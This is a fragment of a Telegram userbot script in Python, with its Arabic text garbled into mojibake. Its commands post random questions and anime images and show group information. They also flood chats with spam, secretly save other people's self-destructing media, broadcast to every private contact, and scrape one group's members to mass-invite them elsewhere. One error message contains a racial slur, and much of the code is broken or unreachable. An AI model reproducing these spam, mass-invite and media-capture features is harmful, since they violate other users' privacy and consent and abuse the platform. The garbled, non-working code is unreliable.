    "ŸáŸÑ ÿ™ÿπÿ™ŸÇÿØ ÿ£ŸÜ ÿßŸÑÿ±Ÿàÿ®Ÿàÿ™ÿßÿ™ ÿ≥ÿ™ÿ≥Ÿäÿ∑ÿ± ÿπŸÑŸâ ÿßŸÑÿπÿßŸÑŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∫ÿ∂ÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿÆÿ¨ŸÑÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∞ŸÜÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿÆŸàŸÅÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ≤ŸÜÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸàÿ≠ÿØÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÇŸÑŸÇÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ•ÿ≠ÿ®ÿßÿ∑ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÖŸÑŸÑÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ™ÿπÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ¨Ÿàÿπÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿπÿ∑ÿ¥ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÜÿπÿßÿ≥ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ®ÿ±ÿØÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ±ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ£ŸÑŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ±ÿßÿ≠ÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÉÿ±ÿßŸáŸäÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∫Ÿäÿ±ÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ≥ÿØÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÜÿØŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∞ŸÑÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÖŸáÿßŸÜÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∏ŸÑŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∫ŸÅÿ±ÿßŸÜÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ¥ŸÉÿ±ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿßÿ≠ÿ™ÿ±ÿßŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ™ŸÇÿØŸäÿ±ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ´ŸÇÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ£ŸÖÿßŸÜÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≥ÿπÿßÿØÿ©ÿü"
]


image_links = [
    "https://t.me/Sk_x2/10",
    "https://t.me/Sk_x2/11",
    "https://t.me/Sk_x2/12",
    "https://t.me/Sk_x2/13",
    "https://t.me/Sk_x2/14",
    "https://t.me/Sk_x2/15",
    "https://t.me/Sk_x2/16",
    "https://t.me/Sk_x2/17",
    "https://t.me/Sk_x2/18",
    "https://t.me/Sk_x2/19",
    "https://t.me/Sk_x2/20",
    "https://t.me/Sk_x2/21",
    "https://t.me/Sk_x2/22",
    "https://t.me/Sk_x2/23",
    "https://t.me/Sk_x2/24",
    "https://t.me/Sk_x2/25",
    "https://t.me/Sk_x2/26",
    "https://t.me/Sk_x2/27",
    "https://t.me/Sk_x2/28",
    "https://t.me/Sk_x2/29",
    "https://t.me/Sk_x2/30",
    "https://t.me/Sk_x2/31",
    "https://t.me/Sk_x2/32",
    "https://t.me/Sk_x2/33",
    "https://t.me/Sk_x2/34",
    "https://t.me/Sk_x2/35",
    "https://t.me/Sk_x2/36",
    "https://t.me/Sk_x2/37",
    "https://t.me/Sk_x2/38",
    "https://t.me/Sk_x2/39",
    "https://t.me/Sk_x2/40",
    "https://t.me/Sk_x2/41",
    "https://t.me/Sk_x2/42",
    "https://t.me/Sk_x2/43",
    "https://t.me/Sk_x2/44",
    "https://t.me/Sk_x2/45",
    "https://t.me/Sk_x2/46",
    "https://t.me/Sk_x2/47",
    "https://t.me/Sk_x2/48",
    "https://t.me/Sk_x2/49",
    "https://t.me/Sk_x2/50",
    "https://t.me/Sk_x2/51",
    "https://t.me/Sk_x2/52",
    "https://t.me/Sk_x2/53",
    "https://t.me/Sk_x2/54",
    "https://t.me/Sk_x2/55",
    "https://t.me/Sk_x2/56",
    "https://t.me/Sk_x2/57",
    "https://t.me/Sk_x2/58",
    "https://t.me/Sk_x2/59",
    "https://t.me/Sk_x2/60",
    "https://t.me/Sk_x2/61",
    "https://t.me/Sk_x2/62",
    "https://t.me/Sk_x2/63",
    "https://t.me/Sk_x2/64",
    "https://t.me/Sk_x2/65",
    "https://t.me/Sk_x2/66",
    "https://t.me/Sk_x2/67",
    "https://t.me/Sk_x2/68",
    "https://t.me/Sk_x2/69",
    "https://t.me/Sk_x2/70",
    "https://t.me/Sk_x2/71",
    "https://t.me/Sk_x2/72",
    "https://t.me/Sk_x2/73",
    "https://t.me/Sk_x2/74",
    "https://t.me/Sk_x2/75",
    "https://t.me/Sk_x2/76",
    "https://t.me/Sk_x2/77",
    "https://t.me/Sk_x2/78",
    "https://t.me/Sk_x2/79",
    "https://t.me/Sk_x2/80",
    "https://t.me/Sk_x2/81",
    "https://t.me/Sk_x2/82",
    "https://t.me/Sk_x2/83",
    "https://t.me/Sk_x2/84",
    "https://t.me/Sk_x2/85",
    "https://t.me/Sk_x2/86",
    "https://t.me/Sk_x2/87",
    "https://t.me/Sk_x2/88",
    "https://t.me/Sk_x2/89",
    "https://t.me/Sk_x2/90",
    "https://t.me/Sk_x2/91",
    "https://t.me/Sk_x2/92",
    "https://t.me/Sk_x2/93",
    "https://t.me/Sk_x2/94",
    "https://t.me/Sk_x2/95",
    "https://t.me/Sk_x2/96",
    "https://t.me/Sk_x2/97"
]













@client.on(events.NewMessage(outgoing=True, pattern=r"(^\.ŸÉÿ™|\s\.ŸÉÿ™)\b|\.ÿßŸÜŸÖŸä"))
async def why(event):
    await event.delete()
    chat = await event.get_chat()

    matched_command = event.pattern_match.string
    if matched_command == ".ŸÉÿ™":
        message = random.choice(questions_list)
        await event.client.send_message(chat, message)

    elif matched_command == ".ÿßŸÜŸÖŸä":
        while True:
            try:
                random_image_link = random.choice(image_links)
                channel_name, message_id = random_image_link.split('/')[-2:]
                message = await client.get_messages(channel_name, ids=int(message_id))
                await client.send_message(chat, "ÿµŸàÿ± ÿßŸÜŸÖŸä:", file=message, silent=True)
                break
            except WebpageMediaEmptyError:
                pass
            
@client.on(events.NewMessage(pattern="\.ŸÉÿ¥ŸÅ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©(?: |$)(.*)", outgoing=True))
async def info_gop(event):
    await event.edit("`ÿ¨ÿßÿ±Ÿç ÿßŸÑŸÅÿ≠ÿµ ...`")
    chat = await get_chatinfo(event)
    caption = await fetch_info(chat, event)
    try:
        await event.edit(caption, parse_mode="html")
    except Exception as e:
        print("Exception:", e)
        await event.edit("`ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ∫Ÿäÿ± ŸÖÿ™ŸàŸÇÿπ.`")
    return

async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
            else:
                chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except ChannelInvalidError:
        await event.edit("`ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑŸÇŸÜÿßÿ© ÿ£Ÿà ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©..`")
        return None
    except ChannelPrivateError:
        await event.edit("`Ÿáÿ∞Ÿá ŸÇŸÜÿßÿ©/ŸÖÿ¨ŸÖŸàÿπÿ© ÿÆÿßÿµÿ© ÿ£Ÿà ÿ™ŸÖ ÿ≠ÿ∏ÿ±Ÿä ŸÖŸÜŸáÿß`")
        return None
    except ChannelPublicGroupNaError:
        await event.edit("`ÿßŸÑŸÇŸÜÿßÿ© ÿ£Ÿà ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØÿ©`")
        return None
    except (TypeError, ValueError) as err:
        await event.edit(str(err))
        return None
    return chat_info

async def fetch_info(chat, event):
    chat_obj_info = await event.client.get_entity(chat.full_chat.id)
    broadcast = getattr(chat_obj_info, "broadcast", False)
    chat_type = "ŸÇŸÜÿßÿ©" if broadcast else "ŸÖÿ¨ŸÖŸàÿπÿ©"
    chat_title = chat_obj_info.title
    warn_emoji = emojize(":warning:")
    # ÿ®ÿßŸÇŸä ÿßŸÑŸÉŸàÿØ...
    caption = "<b>ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖÿ™ÿßÿ≠ÿ©:</b>\n"
    caption += f"ÿßŸÑŸÖÿπÿ±ŸÅ: <code>{chat_obj_info.id}</code>\n"
    if chat_title is not None:
        caption += f"ÿßÿ≥ŸÖ {chat_type}: {chat_title}\n"
    # ÿ®ÿßŸÇŸä ÿßŸÑŸÉŸàÿØ...
    return caption
    if former_title is not None:  
        caption += f"ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ≥ÿßÿ®ŸÇ: {former_title}\n"
    if username is not None:
        caption += f"ŸÜŸàÿπ {chat_type}: ÿπÿßŸÖÿ©\n"
        caption += f"ÿßŸÑÿ±ÿßÿ®ÿ∑: {username}\n"
    else:
       caption += f"ŸÜŸàÿπ {chat_type}: ÿÆÿßÿµÿ©\n"
    if creator_username is not None:
        caption += f"ŸÖŸÜÿ¥ÿ¶ {chat_type}: {creator_username}\n"
    elif creator_valid:
        caption += f"ŸÖŸÜÿ¥ÿ¶ {chat_type}: <a href=\"tg://user?id={creator_id}\">{creator_firstname}</a>\n"
    if created is not None:
        caption += f"ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑÿ•ŸÜÿ¥ÿßÿ°: <code>{created.date().strftime('%b %d, %Y')} - {created.time()}</code>\n"
    else:
        caption += f"ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑÿ•ŸÜÿ¥ÿßÿ°: <code>{chat_obj_info.date.date().strftime('%b %d, %Y')} - {chat_obj_info.date.time()}</code> {warn_emoji}\n"
    caption += f"ŸÖÿπÿ±ŸÅ ŸÖÿ±ŸÉÿ≤ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™: {dc_id}\n"
    if exp_count is not None:
        chat_level = int((1+sqrt(1+7*exp_count/14))/2)
        caption += f"ŸÖÿ≥ÿ™ŸàŸâ {chat_type}: <code>{chat_level}</code>\n"
    if messages_viewable is not None:
        caption += f"ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑŸÇÿßÿ®ŸÑÿ© ŸÑŸÑÿπÿ±ÿ∂: <code>{messages_viewable}</code>\n"
    if messages_sent:
        caption += f"ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑŸÖÿ±ÿ≥ŸÑÿ©: <code>{messages_sent}</code>\n"
    elif messages_sent_alt:
        caption += f"ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑŸÖÿ±ÿ≥ŸÑÿ©: <code>{messages_sent_alt}</code> {warn_emoji}\n"
    if members is not None:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ°: <code>{members}</code>\n"
    if admins is not None:
        caption += f"ÿßŸÑŸÖÿ¥ÿ±ŸÅŸàŸÜ: <code>{admins}</code>\n"
    if bots_list:
        caption += f"ÿßŸÑÿ®Ÿàÿ™ÿßÿ™: <code>{bots}</code>\n"
    if members_online:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿ™ÿµŸÑŸàŸÜ ÿßŸÑÿ¢ŸÜ: <code>{members_online}</code>\n"
    if restrcited_users is not None:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖŸÇŸäÿØŸàŸÜ: <code>{restrcited_users}</code>\n"
    if banned_users is not None:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸàŸÜ: <code>{banned_users}</code>\n"
    if group_stickers is not None:
        caption += f"ŸÖŸÑÿµŸÇÿßÿ™ {chat_type}: <a href=\"t.me/addstickers/{chat.full_chat.stickerset.short_name}\">{group_stickers}</a>\n"
    caption += "\n"
    if not broadcast:
        caption += f"ÿßŸÑŸàÿ∂ÿπ ÿßŸÑÿ®ÿ∑Ÿäÿ°: {slowmode}"
        if hasattr(chat_obj_info, "slowmode_enabled") and chat_obj_info.slowmode_enabled:
            caption += f", <code>{slowmode_time}s</code>\n\n"
        else:
            caption += "\n\n"
    if not broadcast:
        caption += f"ŸÖÿ¨ŸÖŸàÿπÿ© ÿπŸÖŸÑÿßŸÇÿ©: {supergroup}\n\n"
    if hasattr(chat_obj_info, "restricted"):
        caption += f"ŸÖŸÇŸäÿØ: {restricted}\n"
        if chat_obj_info.restricted:
            caption += f"> ÿßŸÑŸÖŸÜÿµÿ©: {chat_obj_info.restriction_reason[0].platform}\n"
            caption += f"> ÿßŸÑÿ≥ÿ®ÿ®: {chat_obj_info.restriction_reason[0].reason}\n"
            caption += f"> ÿßŸÑŸÜÿµ: {chat_obj_info.restriction_reason[0].text}\n\n"
        else:
            caption += "\n"
    if hasattr(chat_obj_info, "scam") and chat_obj_info.scam:
    	caption += "ÿßÿ≠ÿ™ŸäÿßŸÑ: <b>ŸÜÿπŸÖ</b>\n\n"
    if hasattr(chat_obj_info, "verified"):
        caption += f"ÿ™ŸÖ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜŸá ÿ®Ÿàÿßÿ≥ÿ∑ÿ© Telegram: {verified}\n\n"
    if description:
        caption += f"ÿßŸÑŸàÿµŸÅ: \n<code>{description}</code>\n"
    return caption
  
@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ≥ÿ®ÿßŸÖ$"))
async def spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÜÿµŸäÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ±.")

    text = message.text
    for char in text:
        await event.respond(char)
        await asyncio.sleep(0.8)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.Ÿàÿ≥ÿ®ÿßŸÖ$"))
async def word_spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return
    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÜÿµŸäÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ±.")

    words = message.text.split()
    for word in words:
        await event.respond(word)
        await asyncio.sleep(1)

from os import remove

auto_save_enabled = False

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ŸàÿßŸà|\.ÿ≠ŸÅÿ∏ ÿßŸÑÿ∞ÿßÿ™Ÿäÿ©'))
async def rundrc(event):
    await event.delete()
    if event.pattern_match.group(0) == ".ÿ∞ÿßÿ™Ÿäÿ©":
        try:
            getrestrictedcontent = await event.get_reply_message()
            downloadrestrictedcontent = await getrestrictedcontent.download_media()
            await event.client.send_file("me", downloadrestrictedcontent)
            remove(downloadrestrictedcontent)
        except:
            pass
    elif event.pattern_match.group(0) == ".ÿ≠ŸÅÿ∏ ÿßŸÑÿ∞ÿßÿ™Ÿäÿ©":
        global auto_save_enabled
        auto_save_enabled = not auto_save_enabled
        if auto_save_enabled:
            await event.respond("ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ≠ŸÅÿ∏ ÿßŸÑŸàÿ≥ÿßÿ¶ÿ∑ ÿ∞ÿßÿ™Ÿäÿ© ÿßŸÑÿ™ÿØŸÖŸäÿ± ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß.")
        else:
            await event.respond("ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ≠ŸÅÿ∏ ÿßŸÑŸàÿ≥ÿßÿ¶ÿ∑ ÿ∞ÿßÿ™Ÿäÿ© ÿßŸÑÿ™ÿØŸÖŸäÿ± ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß.")

@client.on(events.NewMessage)
async def auto_save_media(event):
    if auto_save_enabled:
        try:
            if event.media and event.media.ttl_seconds:
                downloadrestrictedcontent = await event.download_media()
                await event.client.send_file("me", downloadrestrictedcontent)
                remove(downloadrestrictedcontent)
        except:
            pass

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿÆÿßÿµ$"))
async def private_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**‚ñ™Ô∏é|Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ±.**", parse_mode="md")

    chats = await finalll.get_dialogs()
    private_chats = [chat for chat in chats if chat.is_user]

    for chat in private_chats:
        try:
            if message.media:
                await finalll.send_file(chat.id, message.media, caption=message.text)
            else:
                await finalll.send_message(chat.id, message.text)
        except Exception as e:
            print(f"Error in sending message to chat {chat.id}: {e}")

@client.on(events.NewMessage(pattern=".ÿ™ÿ≠ŸàŸäŸÑ ŸÜÿµ ?(.*)"))
async def _(event):
    if event.fwd_from:
        return 
    if not event.reply_to_msg_id:
       await event.edit("‚éôÔ∏ô ŸäŸÄÿ¨ÿ®. ÿßŸÑÿ±ÿØ ÿπŸÑŸÄŸâ ÿ±ÿ≥ŸÄÿßŸÑÿ© ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖ )")
       return
    reply_message = await event.get_reply_message() 
    if not reply_message.text:
       await event.edit("‚éôÔ∏ô ŸäŸÄÿ¨ÿ®. ÿßŸÑÿ±ÿØ ÿπŸÑŸÄŸâ ÿ±ÿ≥ŸÄÿßŸÑÿ© ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖ )")
       return
    chat = "@QuotLyBot"
    sender = reply_message.sender
    if reply_message.sender.bot:
       await event.edit("‚éôÔ∏ô ŸäŸÄÿ¨ÿ®. ÿßŸÑÿ±ÿØ ÿπŸÑŸÄŸâ ÿ±ÿ≥ŸÄÿßŸÑÿ© ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖ )")
       return
    await event.edit("‚éôÔ∏ô ÿ¨ÿßÿ± ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑŸÜÿµ ÿßŸÑŸâ ŸÖŸÑÿµŸÇ")
    async with event.client.conversation(chat) as conv:
          try:     
              response = conv.wait_event(events.NewMessage(incoming=True,from_users=1031952739))
              await event.client.forward_messages(chat, reply_message)
              response = await response 
          except YouBlockedUserError: 
              await event.reply("```Please unblock me (@QuotLyBot) u Nigga```")
              return
          if response.text.startswith("Hi!"):
             await event.edit("‚éôÔ∏ô Ÿäÿ¨ŸÄÿ® ÿßŸÑÿ∫ÿßÿ° ÿÆÿµŸÄŸàÿµŸäÿ© ÿßŸÑÿ™Ÿàÿ¨ŸäŸÄŸá ÿßŸàŸÑÿß")
          else: 
             await event.delete()
             await event.client.send_message(event.chat_id, response.message)
             

@client.on(events.NewMessage(pattern=r".ÿ∂ŸäŸÅ ?(.*)"))
async def get_users(event):   
    sender = await event.get_sender() ; me = await event.client.get_me()
    if not sender.id == me.id:
        roz = await event.reply("**‚ñæ‚àÆ ÿ™ÿ™ŸÄŸÖ ÿßŸÑÿπŸÄŸÖŸÑŸäÿ© ÿßŸÜÿ™ÿ∏ŸÄ‡¢™ ŸÇŸÑŸäŸÑÿß ‚éô ...**")
    else:
        roz = await event.edit("**‚ñæ‚àÆ ÿ™ÿ™ŸÄŸÖ ÿßŸÑÿπŸÄŸÖŸÑŸäÿ© ÿßŸÜÿ™ÿ∏ŸÄ‡¢™ ŸÇŸÑŸäŸÑÿß ‚éô ...**.")
    JoKeRUB = await get_chatinfo(event) ; chat = await event.get_chat()
    if event.is_private:
              return await roz.edit("**‚ñæ‚àÆ ŸÑÿß ŸäŸÖŸÉŸÜŸÜŸÄŸä ÿßÿ∂ÿßŸÅŸÄÿ© ÿßŸÑŸÖŸÄÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ ŸáŸÄŸÜÿß**")    
    s = 0 ; f = 0 ; error = 'None'   
  
    await roz.edit("**‚ñæ‚àÆ ÿ≠ŸÄÿßŸÑÿ© ÿßŸÑÿ£ÿ∂ÿßŸÅÿ©:**\n\n**‚ñæ‚àÆ ÿ™ÿ™ŸÄŸÖ ÿ¨ŸÄŸÖÿπ ŸÖÿπŸÄŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ üîÑ ...‚è£**")
    async for user in event.client.iter_participants(JoKeRUB.full_chat.id):
                try:
                    if error.startswith("Too"):
                        return await roz.edit(f"**ÿ≠ŸÄÿßŸÑÿ© ÿßŸÑÿ£ÿ∂ŸÄÿßŸÅÿ© ÿßŸÜÿ™ŸÄŸáÿ™ ŸÖŸÄÿπ ÿßŸÑÿ£ÿÆŸÄÿ∑ÿßÿ°**\n- (**ÿ±ÿ®ŸÄŸÖÿß ŸáŸÄŸÜÿßŸÑŸÉ ÿ∂ÿ∫ŸÄÿ∑ ÿπŸÄŸÑŸâ ÿßŸÑÿ£ŸÖ‡¢™ ÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿ¨ŸÄÿØÿß ŸÑÿßÿ≠ŸÇŸÄÿß üß∏**) \n**ÿßŸÑŸÄÿÆÿ∑ÿ£** : \n`{error}`\n\n‚Ä¢ ÿßÿ∂ÿßŸÑŸÄÿ© `{s}` \n‚Ä¢ ÿÆŸÄÿ∑ÿ£ ÿ®ÿ£ÿ∂ÿßŸÅŸÄÿ© `{f}`"),
                    await event.client(functions.channels.InviteToChannelRequest(channel=chat,users=[user.id]))
                    s = s + 1                                                    
                    await roz.edit(f"**‚ñæ‚àÆÿ™ÿ™ŸÄŸÖ ÿßŸÑÿ£ÿ∂ŸÄÿßŸÅÿ© ‚éô**\n\n‚Ä¢ ÿßÿ∂ŸÄŸäŸÅ `{s}` \n‚Ä¢  ÿÆŸÄÿ∑ÿ£ ÿ®ÿ£ÿ∂ÿßŸÅŸÄÿ© `{f}` \n\n**√ó ÿßÿÆŸÄÿ± ÿÆŸÄÿ∑ÿ£:** `{error}`") 
                except Exception as e:
                    error = str(e) ; f = f + 1             
